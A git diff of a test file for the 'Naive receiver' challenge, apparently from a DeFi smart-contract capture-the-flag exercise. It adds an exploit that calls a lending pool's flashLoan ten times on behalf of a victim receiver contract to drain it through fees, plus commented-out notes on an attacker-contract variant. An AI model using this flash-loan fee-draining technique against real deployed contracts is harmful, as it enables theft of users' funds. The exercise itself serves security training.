@@ -1,8 +1,13 @@
-const { ethers } = require('hardhat');
+const { ethers,} = require('hardhat');
 const { expect } = require('chai');
+
 
 describe('[Challenge] Naive receiver', function () {
     let deployer, user, attacker;
+
+    // //adding AttackerNaivereceiver artifact
+    // const AttackerNaiveReceiver = new ethers.getContractFactory("AttackerNaiveReceiver")
+    // // Contract.fromArtifact('AttackerNaiveReceiver');
 
     // Pool has 1000 ETH in balance
     const ETHER_IN_POOL = ethers.utils.parseEther('1000');
@@ -31,7 +36,15 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
-    });
+        for(let i=0; i<10; i++){
+            await this.pool.flashLoan(this.receiver.address, 0);
+            
+        }
+        //another solution
+        // this.attacker = await AttackerNaiveReceiver.new(this.pool.address);
+        // await this.attacker.hackReceiver(this.receiver.address);
+    // }
+});
 
     after(async function () {
         /** SUCCESS CONDITIONS */
